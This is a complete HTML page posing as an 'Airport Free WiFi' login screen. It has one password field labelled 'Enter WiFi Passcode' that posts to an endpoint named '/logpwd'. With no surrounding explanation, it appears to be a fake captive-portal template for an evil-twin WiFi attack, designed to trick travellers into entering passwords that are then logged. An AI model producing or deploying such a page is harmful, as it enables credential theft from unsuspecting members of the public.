<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Airport Free WiFi</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(to bottom, #87CEEB, #4682B4); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .terminal { background: #000; color: #0f0; padding: 30px; border-radius: 10px; font-family: 'Courier New', monospace; width: 350px; }
        .header { text-align: center; font-size: 24px; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #111; color: #0f0; border: 1px solid #0f0; border-radius: 3px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; margin-top: 10px; }
        button:hover { background: #0c0; }
    </style>
</head>
<body>
    <div class="terminal">
        <div class="header">✈️ AIRPORT FREE WiFi</div>
        <form action="/logpwd" method="POST">
            <input type="password" name="pwd" placeholder="Enter WiFi Passcode" required>
            <button type="submit">ACCESS INTERNET</button>
        </form>
    </div>
</body>
</html>
